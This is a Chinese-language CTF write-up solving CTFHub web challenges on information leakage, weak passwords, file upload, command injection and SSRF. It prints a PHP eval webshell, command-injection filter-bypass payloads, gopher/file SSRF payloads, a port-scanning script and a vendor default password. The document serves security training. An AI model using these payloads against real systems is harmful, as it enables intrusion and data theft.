title: CTFHub之web刷题记录
author: bmth
tags:
  - 刷题笔记
  - CTF
categories: []
img: 'https://img-blog.csdnimg.cn/20210304211601263.png'
date: 2020-10-27 22:31:00
---
[CTFHub](https://www.ctfhub.com)
[CTFHub官方的对外知识库](https://www.wolai.com/ctfhub/mx8kc7g4asd98bs8N2nk7F)

## 信息泄露

### 目录遍历
就真的一个一个找。。。。。在2/1处找到flag
![](https://img-blog.csdnimg.cn/20200312111622791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### PHPINFO
按`ctrl+f搜索`，就可以在phpinfo里面找到了flag，或者自己翻
![](https://img-blog.csdnimg.cn/2020031211195385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 备份文件下载
#### 网站源码
当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
![](https://img-blog.csdnimg.cn/20200312112129389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
有提示，提示我们网站源码备份文件的文件名和后缀，一个一个试，其实我们试试zip和rar就行了，因为tar和tar.gz是linux下的压缩包
![](https://img-blog.csdnimg.cn/20200312112639140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

在`www.zip`的到压缩包，随后打开

![](https://img-blog.csdnimg.cn/20200312112902313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
打开发现flag并不在txt里面，那么只能在50x.html下或者网站的flag_1054212331.txt下了，随后就得到了flag
![](https://img-blog.csdnimg.cn/20200312113313753.png)
#### bak文件
提示`Flag in index.php source code. `，Flag在index.php的源代码中，由于题目是.bak文件，访问即可下载源码
![](https://img-blog.csdnimg.cn/20200312114358580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
即可得到flag
![](https://img-blog.csdnimg.cn/2020031211464023.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
#### vim缓存
由于在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容：
**第一次产生的交换文件名为 .index.php.swp
再次意外退出后，将会产生名为 .index.php.swo 的交换文件
第三次产生的交换文件则为 .index.php.swn**
![](https://img-blog.csdnimg.cn/20200312115520909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
由于是.swp文件，我们要用vim打开，打开虚拟机，使用`vim -r index.php.swp`修复了原文件，得到flag
![](https://img-blog.csdnimg.cn/20200312120453209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
#### .DS_Store
.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。
![](https://img-blog.csdnimg.cn/20200312122058540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)下载得到`DS_Store.DS_Store`，这里使用python工具来解析它，下载地址：[Python-dsstore](https://github.com/gehaxelt/Python-dsstore)
![](https://img-blog.csdnimg.cn/20200312123110461.png)
得到了164cf3474ba1064d8faffde91b3b61e6.txt，访问即可得到flag
### Git泄露
当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。
首选，我们要下一个工具：[GitHack](https://github.com/BugScanTeam/GitHack)，并且需要有git指令就可以了
#### Log
发现有/.git/目录，使用 GitHack 工具 clone 目标源代码到本地
![](https://img-blog.csdnimg.cn/20200312133800943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后`git log`查看历史记录
![](https://img-blog.csdnimg.cn/20200312133942275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
当前所处的版本为 `remove flag`，flag 在 `add flag`，我们就要切换版本`git reset --hard 95b05
`![](https://img-blog.csdnimg.cn/20200312134706647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
随后在1071106473166.txt 得到flag
#### Stash
stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。
同理先clone到本地，随后执行`git stash list `发现有 stash，随后执行`git stash pop` 发现从 git 栈中弹出来一个文件就是flag![](https://img-blog.csdnimg.cn/2020031213574879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
#### Index
同理先clone， 因为题目是index，所以我们考虑到git的index暂存区文件，[git 查看暂存区](https://www.cnblogs.com/panbingwen/p/10736915.html)，首先执行`git ls-files`查看有哪些文件
![](https://img-blog.csdnimg.cn/20200312141007748.png)
随后查看5713690431814.txt文件对应的Blob对象`git ls-files -s`，最后查看文件内容
![](https://img-blog.csdnimg.cn/2020031214131832.png)

### SVN泄露
当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。
我们又要下载一个软件：[dvcs-ripper](https://github.com/kost/dvcs-ripper)，并安装Perl模块，随后开始
![](https://img-blog.csdnimg.cn/20200312124636770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
403禁止访问，但确实有目录，使用 dvcs-ripper 工具中的 rip-svn.pl 脚本进行 clone. `perl rip-svn.pl -u http://challenge-58162c74c9e40399.sandbox.ctfhub.com:10080/.svn/`然后查看文件发现生成.svn
![](https://img-blog.csdnimg.cn/20200312143127527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
进入并查看文件，由于svn1.7后的版本引入一个名为wc.db的数据库数据存放文件来管理文件
![](https://img-blog.csdnimg.cn/20200312143208902.png)
从 wc.db 中找到 flag 的文件的文件名，访问404发现已经发现被删除了，所以我们到缓存文件夹pristine去找，最后得到flag
![](https://img-blog.csdnimg.cn/20200312144004650.png)
### HG泄露
当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。
工具使用和上题一样的，先克隆到本地`perl rip-hg.pl -u http://challenge-00efb8d5c92a2052.sandbox.ctfhub.com:10080/.hg/`
![](https://img-blog.csdnimg.cn/20200312144720710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后就是找了，最后在`.hg/store/fncache`发现了flag_140302720.txt.i
![](https://img-blog.csdnimg.cn/2020031214492877.png)
接下来访问得到了flag
![](https://img-blog.csdnimg.cn/20200312145437771.png)
## 密码口令
### 弱口令
使用burp抓包爆破
![](https://img-blog.csdnimg.cn/20200312191214445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
抓包后传入inturder模块，选择爆破模式：Sniper，这里先猜测账号为admin，然后设置password为变量
![](https://img-blog.csdnimg.cn/20200312193038265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
导入弱口令字典即可进行爆破了，前提是密码本里有正确的账号密码，然后社区版的巨慢，要使用专业版的。~~网上可找到破解版的~~
![](https://img-blog.csdnimg.cn/20200312194127453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
返回长度不一样的为正确的密码，即账号为admin，密码为password，登录即可得到flag
### 默认口令
![](https://img-blog.csdnimg.cn/20200312194223645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
由于有验证码，无法直接爆破，尝试一些默认的账号密码，由于是eYou邮件网关，去网上搜索，在[eYou(亿邮)邮箱系统系列产品若干个漏洞](https://www.2cto.com/article/201305/214623.html)找到相关账号密码
![](https://img-blog.csdnimg.cn/20200312195810916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
一个一个试，当账号密码为`eyougw:admin@(eyou)`时进入，得到了flag
![](https://img-blog.csdnimg.cn/20200312195955866.png)


## 文件上传
### 无验证
直接上传一句话木马`<?php @eval($_POST['pass']);?>`
![](https://img-blog.csdnimg.cn/20200313111622454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
打开蚁剑，输入密码连接，注意URL地址是一句话木马的路径
![](https://img-blog.csdnimg.cn/20200313111808748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
即可得到flag
![](https://img-blog.csdnimg.cn/20200313111935169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 前端验证
上传.php文件，发现不允许上传，因为是js前端检验，可直接抓包绕过再改回后缀名即可
![](https://img-blog.csdnimg.cn/20200313112556997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
上传2.jpg，再抓包改回2.php，发现上传成功
![](https://img-blog.csdnimg.cn/20200313112925364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### MIME绕过
抓包，将Content-Type类型改为jpg，png或gif的格式即可
![](https://img-blog.csdnimg.cn/20200313113512859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
这里我用jpg格式发现上传失败了，改用gif格式上传成功的，应该改为jpeg
### .htaccess
htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能
![](https://img-blog.csdnimg.cn/20210323154852621.png)
由于之前写过类似的了，这里直接用，先上传.htaccess，上传成功
![](https://img-blog.csdnimg.cn/202003131151154.png)
接下来上传xxx.jpg，发现并未以jpg格式解析，而是php格式解析的，接下来一句话即可
![](https://img-blog.csdnimg.cn/20200313115253301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

### 双写后缀
上传php发现上传成功，但php后缀被删除了，依照题目应该要双写后缀
![](https://img-blog.csdnimg.cn/20200313114243457.png)
上传`2.pphphp`成功变为2.php，即可执行一句话获得flag
![](https://img-blog.csdnimg.cn/2020031311454524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## RCE
### 命令注入
首先ls查看有哪些文件`www.baidu.com ; ls`
![](https://img-blog.csdnimg.cn/20200313122029376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现有216872332227313.php，cat一下`www.baidu.com ; cat 216872332227313.php`,然后在源代码发现flag
![](https://img-blog.csdnimg.cn/20200313122432781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 过滤cat
`127.0.0.1 ; ls`先查看文件，发现了flag_169413020618490.php
![](https://img-blog.csdnimg.cn/20200313122653600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现cat被过滤了，那么我们就要构造cat，在linux下可尝试构造
![](https://img-blog.csdnimg.cn/20200313123319767.png)
`127.0.0.1 ; a=ca;b=t;$a$b flag_169413020618490.php`，在源码得到flag
![](https://img-blog.csdnimg.cn/20200313123452359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 过滤空格
先进行过滤空格总结，在linux环境下进行试验
`1:<>`  `2:<` `3:${IFS}` 
![](https://img-blog.csdnimg.cn/20200313124141804.png)
由于${IFS}没有什么问题，用它来解题，同理先查看文件 `127.0.0.1;ls`
 ![](https://img-blog.csdnimg.cn/20200313124419642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
 
然后读取flag `127.0.0.1;cat${IFS}flag_23126758913777.php`,源码得到flag
![](https://img-blog.csdnimg.cn/20200313124819291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 过滤目录分隔符
首先查看文件`127.0.0.1 ; ls`
![](https://img-blog.csdnimg.cn/20200313125004512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现有flag_is_here，我们要进入目录下拿flag，`127.0.0.1 ; cd flag_is_here ; ls`
![](https://img-blog.csdnimg.cn/20200313125416531.png)
然后将ls改为cat flag即可`127.0.0.1 ; cd flag_is_here ; cat flag_1918363312881.php`，源码得到flag
![](https://img-blog.csdnimg.cn/20200313125611165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 过滤运算符
和前面的题一样，思路一模一样。。。。这里没有过滤 ；差评。`127.0.0.1 ; ls`
![](https://img-blog.csdnimg.cn/20200313131541875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`127.0.0.1 ; cat flag_225062507519043.php`
![](https://img-blog.csdnimg.cn/2020031313174768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 综合过滤练习
![](https://img-blog.csdnimg.cn/20200313132006894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
这就真的全过滤了，这里就要用到另外两种命令分隔符了`%0a(换行符) 、%0d(回车符) `，并且在url下写入:
`?ip=127.0.0.1%0als#`
![](https://img-blog.csdnimg.cn/20200313140136434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
接下来查看flag_is_here文件夹，我这里使用Hex编码查看，
`?ip=127.0.0.1%0als${IFS}$(printf${IFS}"\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65")#`
![](https://img-blog.csdnimg.cn/2020031315024671.png)
![](https://img-blog.csdnimg.cn/20200313143111408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到了flag的文件名，接下来就是读取了，由于过滤了cat，可以用`ca''t`或`ca""t`来绕过，并且对下面进行16进制编码
`ip=127.0.0.1%0aca''t${IFS}$(printf${IFS}"\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65\x2f\x66\x6c\x61\x67\x5f\x36\x33\x31\x38\x31\x35\x30\x35\x33\x33\x34\x2e\x70\x68\x70")#`
![](https://img-blog.csdnimg.cn/20200313150351518.png)
![](https://img-blog.csdnimg.cn/20200313145058710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

## SSRF
ctfhub终于出新题了，泪目，从0开始的ssrf学习之旅
### 内网访问
提示：尝试访问位于127.0.0.1的flag.php吧

直接访问`?url=127.0.0.1/flag.php`
![](https://img-blog.csdnimg.cn/20200927175541662.png#pic_center)
### 伪协议读取文件
[[WEB安全]SSRF中URL的伪协议](https://www.cnblogs.com/-mo-/p/11673190.html)
[SSRF在有无回显方面的利用及其思考与总结](https://xz.aliyun.com/t/6373#toc-8)

提示：尝试去读取一下Web目录下的flag.php吧
```
URL伪协议：
file://  本地文件传输协议，File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样
dict://  Dict协议,字典服务器器协议,dict是基于查询响应的TCP协议,它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628
gopher://  Gopher协议是互联网上使用的分布型的文件搜集获取网络协议。gopher协议是在HTTP协议出现之前,在internet上常见重用的协议,但是现在已经用的很少了
sftp://  Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作
ldap://  LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议
tftp://  TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。
```
由于题目是伪协议读取文件，又是web目录下，使用绝对路径，直接上payload：`?url=file:///var/www/html/flag.php`
![](https://img-blog.csdnimg.cn/2020092718100556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

### 端口扫描
提示：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦

直接使用bp进行端口爆破
![](https://img-blog.csdnimg.cn/20200927195911911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
或者使用python脚本爆破
```python
import requests
url='http://challenge-48d05bc5759898a5.sandbox.ctfhub.com:10080/?url=127.0.0.1:'
port=8000
while port<=9000:
    Wholeurl=url+str(port)
    r = requests.get(Wholeurl)
    print(Wholeurl)
    if(len(r.content)!=0):
        print(port)
        print(r.content)
        break
    port=port+1
print("over")
```
![](https://img-blog.csdnimg.cn/20200927200714747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

### POST请求
提示：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.我准备了一个302.php,可能对你有用哦

看到提示，访问302.php试试，得到了源码
![](https://img-blog.csdnimg.cn/20200928140644866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
访问flag.php得到了一个key
![](https://img-blog.csdnimg.cn/20200928140809779.png#pic_center)
使用file伪协议可以读取源码，得到：
```php
<?php

error_reporting(0);

if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
    echo "Just View From 127.0.0.1";
    return;
}

$flag=getenv("CTFHUB");
$key = md5($flag);

if(isset($_POST["key"]) && $_POST["key"] == $key){
    echo $flag;
    exit;
}
?>

<form action="/flag.php" method="post">
<input type="text" name="key">
<!-- Debug: key=<?php echo $key;?>-->
</form>

```
~~看了wp回来~~，这题需要用gopher协议通过302.php的跳转去post key到flag.php，不过需要注意的是要从127.0.0.1发送数据。
首先构造一个最基本的post请求：
```shell
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36   #特别注意此处的长度，长度不对也是不行的

key=2ddf50f048c2728241fc9c1a6a2d0eac  #key需要去通过127.0.0.1访问flag.php获取，也就是flag的MD5值。
```
首先进行一次url编码，将换行%0A改成%0D%0A
```cmd
POST%20%2Fflag.php%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Akey%3D2ddf50f048c2728241fc9c1a6a2d0eac
```
然后再进行2次URL编码，也就是说一共要进行三次URL编码，最后为：
```cmd
POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D2ddf50f048c2728241fc9c1a6a2d0eac
```
最后使用gopher协议请求即可
```cmd
?url=127.0.0.1/302.php?url=gopher://127.0.0.1:80/_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D2ddf50f048c2728241fc9c1a6a2d0eac
```
![](https://img-blog.csdnimg.cn/2020092814310565.png#pic_center)
![](https://img-blog.csdnimg.cn/20200928143831366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

### 上传文件
提示：这次需要上传一个文件到flag.php了.我准备了个302.php可能会有用.祝你好运

使用file伪协议读取到源码`?url=file:///var/www/html/flag.php`
```php
<?php

error_reporting(0);

if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
    echo "Just View From 127.0.0.1";
    return;
}

if(isset($_FILES["file"]) && $_FILES["file"]["size"] > 0){
    echo getenv("CTFHUB");
    exit;
}
?>
```
题目让我们通过127.0.0.1访问flag.php上传一个文件上去就会返回flag
在构造请求之前我们随便构造一个文件上传的代码，如下：
```html
<!DOCTYPE html>
<html>
<head>
<title>test XXE</title>
<meta charset="utf-8">
</head>
<body>
<form action="http://127.0.0.1/flag.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" value="go" />
</form>
</body>
```
随便上传一个文件并进行抓包，得到了一个数据包
![](https://img-blog.csdnimg.cn/20200928161502784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
然后进行三次url编码，最后得到：(不知道为何我的url编码总是不成功，这是复制大佬的payload)
```
gopher://127.0.0.1:80/_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250d%25250aHost%25253A%25253127.0.0.1%25250d%25250aContent-Length%25253A%252520333%25250d%25250a%252543%252561%252563%252568%252565%25252d%252543%25256f%25256e%252574%252572%25256f%25256c%25253a%252520%25256d%252561%252578%25252d%252561%252567%252565%25253d%252530%25250d%25250a%252555%252570%252567%252572%252561%252564%252565%25252d%252549%25256e%252573%252565%252563%252575%252572%252565%25252d%252552%252565%252571%252575%252565%252573%252574%252573%25253a%252520%252531%25250d%25250a%25254f%252572%252569%252567%252569%25256e%25253a%252520%252568%252574%252574%252570%25253a%25252f%25252f%252531%252539%252532%25252e%252531%252536%252538%25252e%252531%252533%252539%25252e%252531%25250d%25250a%252543%25256f%25256e%252574%252565%25256e%252574%25252d%252554%252579%252570%252565%25253a%252520%25256d%252575%25256c%252574%252569%252570%252561%252572%252574%25252f%252566%25256f%252572%25256d%25252d%252564%252561%252574%252561%25253b%252520%252562%25256f%252575%25256e%252564%252561%252572%252579%25253d%25252d%25252d%25252d%25252d%252557%252565%252562%25254b%252569%252574%252546%25256f%252572%25256d%252542%25256f%252575%25256e%252564%252561%252572%252579%252574%25254c%252574%252544%252566%252562%25256d%252536%252548%252578%252575%252578%252567%252576%252556%252578%25250d%25250a%252555%252573%252565%252572%25252d%252541%252567%252565%25256e%252574%25253a%252520%25254d%25256f%25257a%252569%25256c%25256c%252561%25252f%252535%25252e%252530%252520%252528%252557%252569%25256e%252564%25256f%252577%252573%252520%25254e%252554%252520%252531%252530%25252e%252530%25253b%252520%252557%252569%25256e%252536%252534%25253b%252520%252578%252536%252534%252529%252520%252541%252570%252570%25256c%252565%252557%252565%252562%25254b%252569%252574%25252f%252535%252533%252537%25252e%252533%252536%252520%252528%25254b%252548%252554%25254d%25254c%25252c%252520%25256c%252569%25256b%252565%252520%252547%252565%252563%25256b%25256f%252529%252520%252543%252568%252572%25256f%25256d%252565%25252f%252538%252535%25252e%252530%25252e%252534%252531%252538%252533%25252e%252531%252530%252532%252520%252553%252561%252566%252561%252572%252569%25252f%252535%252533%252537%25252e%252533%252536%25250d%25250a%252541%252563%252563%252565%252570%252574%25253a%252520%252574%252565%252578%252574%25252f%252568%252574%25256d%25256c%25252c%252561%252570%252570%25256c%252569%252563%252561%252574%252569%25256f%25256e%25252f%252578%252568%252574%25256d%25256c%25252b%252578%25256d%25256c%25252c%252561%252570%252570%25256c%252569%252563%252561%252574%252569%25256f%25256e%25252f%252578%25256d%25256c%25253b%252571%25253d%252530%25252e%252539%25252c%252569%25256d%252561%252567%252565%25252f%252561%252576%252569%252566%25252c%252569%25256d%252561%252567%252565%25252f%252577%252565%252562%252570%25252c%252569%25256d%252561%252567%252565%25252f%252561%252570%25256e%252567%25252c%25252a%25252f%25252a%25253b%252571%25253d%252530%25252e%252538%25252c%252561%252570%252570%25256c%252569%252563%252561%252574%252569%25256f%25256e%25252f%252573%252569%252567%25256e%252565%252564%25252d%252565%252578%252563%252568%252561%25256e%252567%252565%25253b%252576%25253d%252562%252533%25253b%252571%25253d%252530%25252e%252539%25250d%25250a%252552%252565%